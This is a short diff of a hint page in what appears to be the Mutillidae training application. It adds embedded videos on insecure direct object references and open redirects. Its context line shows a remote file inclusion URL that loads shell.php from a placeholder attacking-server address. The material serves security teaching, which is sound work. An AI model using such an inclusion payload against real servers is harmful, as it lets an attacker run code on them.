@@ -45,4 +45,6 @@ http://mutillidae/index.php?page=http://[ATTACKING SERVER IP ADDRESS]/shell.php?
 <br/>
 <span id="videos" class="report-header">Videos</span>
 <br/><br/>
+<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisInsecureDirectObjectReferenceIDOR);?>
+<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisanOpenRedirect);?>
 <br/><br/>
